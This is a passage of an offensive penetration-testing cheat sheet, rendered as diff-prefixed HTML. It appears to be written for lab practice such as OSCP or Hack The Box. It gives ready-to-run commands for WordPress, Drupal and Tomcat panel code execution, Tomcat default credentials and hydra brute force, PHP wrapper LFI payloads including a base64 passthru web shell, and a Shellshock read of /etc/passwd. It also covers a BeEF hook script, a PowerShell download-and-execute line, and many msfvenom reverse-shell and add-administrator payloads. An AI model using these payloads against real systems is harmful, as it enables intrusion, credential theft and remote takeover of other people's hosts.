+python crawleet.py -u &lt;URL&gt; -b -d <span style="color:#ae81ff">3</span> -e jpg,png,css -f -m -s -x php,txt -y --threads <span style="color:#ae81ff">20</span>
+</code></pre></div><h3 id="wordpress">Wordpress</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># Scan</span>
+wpscan --url http://$URL -e vp,u
+
+<span style="color:#75715e"># Brute force user(s)</span>
+wpscan  --url http://$URL -U <span style="color:#e6db74">&#34;User&#34;</span> -P $passwordFile
+</code></pre></div><h4 id="wordpress-panel-rce">Wordpress panel RCE</h4>
+<p><strong>Reverse Shell or Code Execution Wordpress</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(Modifying a php from the theme used (admin credentials needed))</span>
+
+Appearance -&gt; Editor -&gt; <span style="color:#ae81ff">404</span> Template -&gt; Paste our Php Payload
+
+<span style="color:#75715e">#(Make a get request to the modified resource)</span>
+http://$IP/wp-content/themes/twentytwelve/404.php
+</code></pre></div><h3 id="drupal">Drupal</h3>
+<h4 id="username-enumeration">Username enumeration</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(To enumerate a user)</span>
+In <span style="color:#e6db74">&#39;/user/register&#39;</span> just try to create a username and <span style="color:#66d9ef">if</span> the name is already taken it will be notified :
+**The name admin is already taken**
+
+If you request a new password <span style="color:#66d9ef">for</span> an existing username :
+**Unable to send e-mail. Contact the site administrator <span style="color:#66d9ef">if</span> the problem persists.**
+
+If you request a new password <span style="color:#66d9ef">for</span> a non-existent username :
+**Sorry, test is not recognized as a user name or an e-mail address.**
+
+Accessing /user/&lt;number&gt; you can see the number of existing users :
+/user/1 -&gt; Access denied <span style="color:#f92672">(</span>user exist<span style="color:#f92672">)</span>
+/user/2 -&gt; Page not found <span style="color:#f92672">(</span>user doesn<span style="color:#960050;background-color:#1e0010">&#39;</span>t exist<span style="color:#f92672">)</span>
+</code></pre></div><h4 id="hidden-pages-enumeration">Hidden pages enumeration</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">Fuzz /node/&lt;NUMBER&gt; where &lt;NUMBER&gt; is a number <span style="color:#f92672">(</span>from <span style="color:#ae81ff">1</span> to <span style="color:#ae81ff">500</span> <span style="color:#66d9ef">for</span> example<span style="color:#f92672">)</span>.
+You could find hidden pages <span style="color:#f92672">(</span>test, dev<span style="color:#f92672">)</span> which are not referenced by the search engines.
+
+wfuzz -c -z range,1-500 --hc <span style="color:#ae81ff">404</span> &lt;URL&gt;/node/FUZZ
+</code></pre></div><h4 id="drupal-panel-rce">Drupal panel RCE</h4>
+<p><strong>Remote code execution Drupal</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">You need the plugin php to be installed <span style="color:#f92672">(</span>check it accessing to /modules/php and <span style="color:#66d9ef">if</span> it returns a <span style="color:#ae81ff">403</span> <span style="color:#66d9ef">then</span>, exists, <span style="color:#66d9ef">if</span> not found, <span style="color:#66d9ef">then</span> the plugin php isn<span style="color:#960050;background-color:#1e0010">&#39;</span>t installed<span style="color:#f92672">)</span>
+
+Go to Modules -&gt; <span style="color:#f92672">(</span>Check<span style="color:#f92672">)</span> PHP Filter  -&gt; Save configuration
+
+https://raw.githubusercontent.com/flozz/p0wny-shell/master/shell.php
+
+Then click on Add content -&gt; Select Basic Page or Article -&gt; Write php shellcode on the body -&gt; Select PHP code in Text format -&gt; Select Preview
+</code></pre></div><h3 id="joomla">Joomla</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">joomscan -u &lt;URL&gt;
+./joomlavs.rb --url &lt;URL&gt; -a -v
+</code></pre></div><h2 id="tomcat">Tomcat</h2>
+<h4 id="default-credentials">Default credentials</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">The most interesting path of Tomcat is /manager/html, inside that path you can upload and deploy war files <span style="color:#f92672">(</span>execute code<span style="color:#f92672">)</span>. But  this path is protected by basic HTTP auth, the most common credentials are :
+
+admin:admin
+tomcat:tomcat
+admin:&lt;NOTHING&gt;
+admin:s3cr3t
+tomcat:s3cr3t
+admin:tomcat
+</code></pre></div><h4 id="brute-force-1">Brute force</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">hydra -L &lt;USERS_LIST&gt; -P &lt;PASSWORDS_LIST&gt; -f &lt;IP&gt; http-get /manager/html -vV -u
+</code></pre></div><h4 id="tomcat-panel-rce">Tomcat panel RCE</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># Generate payload</span>
+msfvenom -p java/jsp_shell_reverse_tcp LHOST<span style="color:#f92672">=</span>&lt;IP&gt; LPORT<span style="color:#f92672">=</span>&lt;PORT&gt; -f war &gt; shell.war
+
+<span style="color:#75715e"># Upload payload</span>
+Tomcat6 :
+wget <span style="color:#e6db74">&#39;http://&lt;USER&gt;:&lt;PASSWORD&gt;@&lt;IP&gt;:8080/manager/deploy?war=file:shell.war&amp;path=/shell&#39;</span> -O -
+
+Tomcat7 and above :
+curl -v -u &lt;USER&gt;:&lt;PASSWORD&gt; -T shell.war <span style="color:#e6db74">&#39;http://&lt;IP&gt;:8080/manager/text/deploy?path=/shellh&amp;update=true&#39;</span>
+
+<span style="color:#75715e"># Listener</span>
+nc -lvp &lt;PORT&gt;
+
+<span style="color:#75715e"># Execute payload</span>
+curl http://&lt;IP&gt;:8080/shell/
+</code></pre></div><hr>
+<h1 id="web-application-attack">Web Application attack</h1>
+<h2 id="local-file-inclusion-lfi">Local file inclusion-LFI</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(Linux)</span>
+locate LFI-gracefulsecurity-linux.txt
+
+<span style="color:#75715e">#(Windows)</span>
+locate LFI-gracefulsecurity-windows.txt
+
+<span style="color:#75715e">#(Both)</span>
+locate LFI-LFISuite-pathtotest-huge.txt
+</code></pre></div><h3 id="local-file-inclusion--remote-file-inclusion---lfi--rfi">Local File Inclusion / Remote File Inclusion - LFI / RFI</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
+</code></pre></div><h2 id="php-wrappers">Php Wrappers</h2>
+<h4 id="wrapper-phpfilter">Wrapper &lsquo;php://filter&rsquo;</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">http://example.com/index.php?page<span style="color:#f92672">=</span>php://filter/convert.base64-encode/resource<span style="color:#f92672">=</span>
+</code></pre></div><h4 id="wrapper-expect">Wrapper &lsquo;expect://&rsquo;</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">http://example.com/index.php?page<span style="color:#f92672">=</span>expect://id
+</code></pre></div><h4 id="wrapper-data">Wrapper &lsquo;data://&rsquo;</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">echo <span style="color:#e6db74">&#39;&lt;?php phpinfo(); ?&gt;&#39;</span> | base64 -w0 -&gt; PD9waHAgcGhwaW5mbygpOyA/Pgo<span style="color:#f92672">=</span>
+
+http://example.com/index.php?page<span style="color:#f92672">=</span>data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo<span style="color:#f92672">=</span>
+
+If code execution, you should see phpinfo<span style="color:#f92672">()</span>, go to the disable_functions and craft a payload with functions which aren<span style="color:#e6db74">&#39;t disable.
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74">Code execution with 
+</span><span style="color:#e6db74">	- exec
+</span><span style="color:#e6db74">	- shell_exec
+</span><span style="color:#e6db74">	- system
+</span><span style="color:#e6db74">	- passthru
+</span><span style="color:#e6db74">	- popen
+</span><span style="color:#e6db74">
+</span><span style="color:#e6db74"># Exemple
+</span><span style="color:#e6db74">echo &#39;</span>&lt;?php passthru<span style="color:#f92672">(</span>$_GET<span style="color:#f92672">[</span><span style="color:#e6db74">&#34;cmd&#34;</span><span style="color:#f92672">])</span>;echo <span style="color:#e6db74">&#34;Shell done !&#34;</span>; ?&gt;<span style="color:#960050;background-color:#1e0010">&#39;</span> | base64 -w0 -&gt; PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo<span style="color:#f92672">=</span>
+
+http://example.com/index.php?page<span style="color:#f92672">=</span>data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo<span style="color:#f92672">=</span>
+
+If there is <span style="color:#e6db74">&#34;Shell done !&#34;</span> on the webpage, <span style="color:#66d9ef">then</span> there is code execution and you can <span style="color:#66d9ef">do</span> things like :
+
+http://example.com/index.php?page<span style="color:#f92672">=</span>data://text/plain;base64,PD9waHAgcGFzc3RocnUoJF9HRVRbImNtZCJdKTtlY2hvICJTaGVsbCBkb25lICEiOyA/Pgo<span style="color:#f92672">=</span>&amp;cmd<span style="color:#f92672">=</span>ls
+</code></pre></div><h4 id="wrapper-input">Wrapper &lsquo;input://&rsquo;</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">curl -k -v <span style="color:#e6db74">&#34;http://example.com/index.php?page=php://input&#34;</span> --data <span style="color:#e6db74">&#34;&lt;?php echo shell_exec(&#39;id&#39;); ?&gt;&#34;</span>
+</code></pre></div><h3 id="command-injection">Command injection</h3>
+<p>For command injection always use BurpSuite !</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection
+</code></pre></div><h3 id="deserialization">Deserialization</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Insecure%20Deserialization
+</code></pre></div><h3 id="file-upload">File upload</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files
+</code></pre></div><h3 id="sql-injection">SQL injection</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection
+
+https://blog.cobalt.io/a-pentesters-guide-to-sql-injection-sqli-16fd570c3532
+</code></pre></div><h3 id="xss">XSS</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection
+
+beef-xss
+cat /usr/share/beef-xss/config.yaml | grep user -C <span style="color:#ae81ff">1</span> <span style="color:#75715e"># user / password</span>
+&lt;script src<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://&lt;IP&gt;:3000/hook.js&#34;</span>&gt;&lt;/script&gt;
+</code></pre></div><h3 id="other-web-vulnerabilities">Other web vulnerabilities</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">https://github.com/swisskyrepo/PayloadsAllTheThings
+</code></pre></div><h3 id="upload-a-file-with-put">Upload a file with PUT</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">curl -X PUT http://&lt;IP&gt;/&lt;FILE&gt; -d @&lt;FILE&gt;  -v
+</code></pre></div><h2 id="shellshock">SHELLSHOCK</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">curl -H <span style="color:#e6db74">&#34;user-agent: () { :; }; echo; echo; /bin/bash -c &#39;cat /etc/passwd&#39;&#34;</span> http://$url/cgi-bin/script.cgi
+</code></pre></div><hr>
+<h2 id="mounts">Mounts</h2>
+<p>Install <strong>==cifs-utils==</strong> tools</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sudo apt-get clean
+sudo apt-get update
+sudo apt-get install cifs-utils
+</code></pre></div><p><strong>Cifs</strong>-&gt; Only Windows
+<strong>NFS</strong>-&gt; Unix Systems</p>
+<h3 id="mount-smbfolder">Mount SmbFolder</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">mount -t cifs -o <span style="color:#e6db74">&#34;username=user,password=password,vers=1.0&#34;</span> //10.11.1.146/SusieShare smbmount
+mount -t cifs  //10.11.1.136/<span style="color:#e6db74">&#34;Bob Share&#34;</span> smb-mount -o <span style="color:#e6db74">&#34;vers=1.0&#34;</span>
+mount -t cifs  //$IP/$Resource $localPath -o <span style="color:#e6db74">&#34;username=SVC_TGS,password=GPPstillStandingStrong2k18,domain=active.htb,rw&#34;</span>
+
+mount -t nfs $IP:$PATH $LOCALPATH
+</code></pre></div><h3 id="mapping-localdrive-to-smb-shared">Mapping LocalDrive to smb shared</h3>
+<p>Check
+<code>smbclient -L //10.10.10.100/share -U &quot;WORKGROUP/L3mon%L3mon123&quot;</code></p>
+<p><code>net use z: \\10.10.10.100\shared L3mon123 /user:l3mon /persistent:no</code></p>
+<h3 id="download-recursive">Download Recursive</h3>
+<p><strong>Smbclient</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">smbclient //10.10.10.100/$folder
+recurse ON
+prompt OFF
+mget *
+
+<span style="color:#75715e">#(or smbget)</span>
+smbget -R smb://$IP/$FOLDER<span style="color:#e6db74">`</span>
+</code></pre></div><h4 id="enumerate-samba-version-with-ngrep">Enumerate Samba Version with ==Ngrep==</h4>
+<p><strong>Version if nmap didn’t detect it</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ngrep -i -d tun0 <span style="color:#e6db74">&#39;s.?a.?m.?b.?a.*[[:digit:]]&#39;</span> port <span style="color:#ae81ff">139</span>
+Smbclient -L &lt;IP&gt;
+
+</code></pre></div><h4 id="nse-scripts-shares-resources">Nse Scripts Shares-Resources</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">nmap -p <span style="color:#ae81ff">111</span> --script<span style="color:#f92672">=</span>nfs-ls,nfs-statfs,nfs-showmount $IP
+</code></pre></div><h4 id="listing-nfs-resources">Listing Nfs Resources</h4>
+<p><strong>When we see Port 2049</strong>  -&gt; Nfs Resources</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">showmount -e $IP
+mount -t nfs &lt;IP&gt;:/&lt;PATH&gt; &lt;LocalPath&gt;
+</code></pre></div><h2 id="ftp-mount">Ftp Mount</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(To mount a ftp share in a folder)</span>
+curlftpfs anonymous:pass@10.10.10.152 ftp-mount
+
+
+<span style="color:#75715e">#(To download a resource recursively)</span>
+ftp $IP
+User: anonymous
+Pass: <span style="color:#e6db74">&#39;null&#39;</span>
+
+binary
+prompt off
+mget *
+
+</code></pre></div><hr>
+<h1 id="network-tools">Network Tools</h1>
+<h3 id="ssh-basics">Ssh Basics</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(Critical ssh files)</span>
+.ssh/authorized<span style="color:#ae81ff">\_</span>keys
+~/.ssh/config, ~/.ssh/known_hosts
+
+<span style="color:#75715e">#(ssh configs files)</span>
+/etc/ssh/ssh_config
+/etc/ssh/sshd_config
+
+<span style="color:#75715e">#(Generate pair of keys)</span>
+ssh-keygen -t rsa -b <span style="color:#ae81ff">2048</span> 
+ssh-keygen -t rsa -b <span style="color:#ae81ff">4096</span> -C <span style="color:#e6db74">&#34;user@domain.com&#34;</span>
+
+<span style="color:#75715e"># Simulating keystroke</span>
+echo -ne <span style="color:#e6db74">$&#39;\r&#39;</span> | ssh-keygen -t rsa -b <span style="color:#ae81ff">4096</span> -N <span style="color:#e6db74">&#39;&#39;</span> <span style="color:#f92672">&lt;&lt;&lt;</span> <span style="color:#e6db74">$&#34;y&#34;</span>
+
+
+<span style="color:#75715e">#(Add passphrase to a key)</span>
+ssh-keygen -p -f id_rsa
+</code></pre></div><p><strong>Diffie helman - sshpass - del Passprase</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ssh USER@IP -oKexAlgorithms<span style="color:#f92672">=</span>+diffie-hellman-group1-sha
+ssh -i id_dsa -oKexAlgorithms<span style="color:#f92672">=</span>+diffie-hellman-group1-sha1 -o PubkeyAcceptedKeyTypes<span style="color:#f92672">=</span>+ssh-dss bob@10.11.1.136
+
+<span style="color:#75715e">#(Loggin with pass)</span>
+sshpass -p <span style="color:#e6db74">&#39;P@55W0rd1!2@&#39;</span> ssh mindy@10.10.10.51 -t bash
+
+<span style="color:#75715e">#(Remove Passphrase key</span>
+openssl rsa -in $key -out $key-nopassphrase
+</code></pre></div><h3 id="scp">SCP</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(Copy a folder to a remote location)</span>
+scp -r $folder user@ip:/home/$folder
+<span style="color:#75715e">#(Download a remote folder to local)</span>
+scp -r user@ip:/home/$remote $localfolder
+
+<span style="color:#75715e">#(update a  files)</span>
+scp -i /tmp/hosts ec2-user@:/tmp/hosts
+
+<span style="color:#75715e">#(mount remote directory as local folder)</span>
+sshfs name@server:/path/remote_folder /path/local_folder
+</code></pre></div><h3 id="port-forwarding">Port Forwarding</h3>
+<p><strong>SSH</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ssh -R 4406:127.0.0.1:4406 user@ip -fNT
+ssh -L 1234:127.0.0.1:3306 root@ip
+</code></pre></div><h3 id="plink-windows">Plink Windows</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">plink.exe -l root -pw hola -R 445:127.0.0.1:445 10.10.14.29 -P  
+plink.exe root@192.168.0.118 -R 445:127.0.0.1:445 -P
+</code></pre></div><h3 id="knockd">Knockd</h3>
+<p>Find the Process</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ps aux | grep “knock”
+
+<span style="color:#75715e">#(Config file Path)</span>
+/etc/knockd.conf
+
+<span style="color:#75715e">#(Knocking Ports nmap)</span>
+<span style="color:#66d9ef">for</span> i in 571, 290, <span style="color:#ae81ff">911</span> ; <span style="color:#66d9ef">do</span> nmap -Pn --max-retries <span style="color:#ae81ff">0</span> -p $i xxx.xx.xx.xx ; <span style="color:#66d9ef">done</span>
+
+</code></pre></div><h3 id="tshark">Tshark</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">tshark -r captura.cap -Y <span style="color:#e6db74">&#34;http&#34;</span> -Tjson 2&gt;/dev/null
+tshark -r captura.cap -Y <span style="color:#e6db74">&#34;http&#34;</span> -Tfields -e tcp.payload 2&gt;/dev/null | xxd -ps -r | grep <span style="color:#e6db74">&#34;Get&#34;</span>
+
+</code></pre></div><h2 id="pivoting">PIVOTING</h2>
+<h3 id="sshuttle">Sshuttle</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">sshuttle &lt;USER&gt;@&lt;IP&gt; &lt;IP_OF_THE_INTERFACE&gt;/CIDR
+</code></pre></div><h3 id="proxychains">Proxychains</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">ssh -f -N -D <span style="color:#ae81ff">9050</span> &lt;USER&gt;@&lt;IP&gt;
+proxychains &lt;COMMAND&gt;
+</code></pre></div><p><strong>Pivoting Article</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">https://artkond.com/2017/03/23/pivoting-guide/
+</code></pre></div><hr>
+<h1 id="msfvenom">Msfvenom</h1>
+<p><strong>List differents Payloads, encoders, formats</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msfvenom --list payloads | grep <span style="color:#e6db74">&#34;windows/shell&#34;</span>
+</code></pre></div><h4 id="create-user">Create User</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msfvenom -p windows/adduser USER<span style="color:#f92672">=</span>attacker PASS<span style="color:#f92672">=</span>attacker@123 -f exe &gt; adduser.exe
+</code></pre></div><h4 id="cmd-shell">Cmd Shell</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msfvenom - p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=(</span>IP Address<span style="color:#f92672">)</span> LPORT<span style="color:#f92672">=(</span>Your Port<span style="color:#f92672">)</span> -f exe &gt; shell .exe
+</code></pre></div><h4 id="execute-command">Execute Command</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msfvenom -a x86 --platform Windows -p windows/exec CMD<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;powershell IEX(New-Object Net.webClient).downloadString(&#39;http://IP/nishang.ps1&#39;)&#34;</span> -f exe -o pay.exe
+msfvenom -a x86 --platform Windows -p windows/exec CMD<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;net user l3mon l3mon123! /add &amp;&amp; net localgroup administrators l3mon /add&#34;</span> -f exe &gt; pay.exe
+</code></pre></div><h4 id="embedded-inside-executable">Embedded inside executable</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msfvenom -p windows/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>&lt;IP&gt; LPORT<span style="color:#f92672">=</span>&lt;PORT&gt; -x /usr/share/-windows-binaries/plink.exe -f exe -o plinkmeter.exe
+</code></pre></div><h4 id="asp---aspx-reverse-shell">Asp - Aspx Reverse Shell</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=(</span>IP Address<span style="color:#f92672">)</span> LPORT<span style="color:#f92672">=(</span>YourPort<span style="color:#f92672">)</span> -f asp &gt; reverse.asp
+msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=(</span>IP Address<span style="color:#f92672">)</span> LPORT<span style="color:#f92672">=(</span>YourPort<span style="color:#f92672">)</span> -f aspx &gt; reverse.aspx
+</code></pre></div><h2 id="linux-">Linux 🐧</h2>
+<h4 id="reverse-shell">Reverse Shell</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=(</span>IP Address<span style="color:#f92672">)</span> LPORT<span style="color:#f92672">=(</span>YourPort<span style="color:#f92672">)</span> -f elf &gt; reverse.elf
+msfvenom -p linux/x64/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>IP LPORT<span style="color:#f92672">=</span>PORT -f elf &gt; shell.elf
+</code></pre></div><h4 id="web-based-payload">Web Based Payload</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msfvenom -p php/meterpreter_reverse_tcp LHOST<span style="color:#f92672">=</span>&lt;IP&gt; LPORT<span style="color:#f92672">=</span>&lt;PORT&gt; -f raw &gt; shell.php
+cat shell.php | pbcopy <span style="color:#f92672">&amp;&amp;</span> echo <span style="color:#e6db74">&#39;&lt;?php &#39;</span> | tr -d <span style="color:#e6db74">&#39;\n&#39;</span> &gt; shell.php <span style="color:#f92672">&amp;&amp;</span> pbpaste &gt;&gt; shell.php
+</code></pre></div><h4 id="jps---jenkins">Jps - Jenkins</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msfvenom -p java/jsp_shell_reverse_tcp LHOST<span style="color:#f92672">=(</span>IP Address<span style="color:#f92672">)</span> LPORT<span style="color:#f92672">=(</span>Your Port<span style="color:#f92672">)</span> -f raw &gt; reverse.jsp
+</code></pre></div><h4 id="tomcat-1">tomcat</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msfvenom -p java/jsp_shell_reverse_tcp LHOST<span style="color:#f92672">=(</span>IP Address<span style="color:#f92672">)</span> LPORT<span style="color:#f92672">=(</span>Your Port<span style="color:#f92672">)</span> -f war &gt; reverse.war
+</code></pre></div><h4 id="python">Python</h4>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell">msfvenom -p cmd /unix/reverse_python LHOST<span style="color:#f92672">=(</span>IP Address<span style="color:#f92672">)</span> LPORT<span style="color:#f92672">=(</span>Your Port<span style="color:#f92672">)</span> -f raw &gt; reverse.py
+</code></pre></div><h2 id="msfvenom-bof-">Msfvenom Bof 🔋</h2>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e">#(Meterpreter Payload)</span>
+msfvenom -p windows/meterpreter/reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.30.77 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span>  EXITFUNC<span style="color:#f92672">=</span>thread -b <span style="color:#e6db74">&#34;\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40&#34;</span> -f python
+
+<span style="color:#75715e">#(Bof reverse shell linux)</span>
+msfvenom -p linux/x86/shell_reverse_tcp LHOST<span style="color:#f92672">=</span>192.168.1.51 LPORT<span style="color:#f92672">=</span><span style="color:#ae81ff">443</span> -a x86 --platform linux -f c -e x86/shikata_ga_nai -b <span style="color:#e6db74">&#34;\x00\x0a\x0d\x20&#34;</span>
+
+<span style="color:#75715e">#(Bof reverse shell)</span>
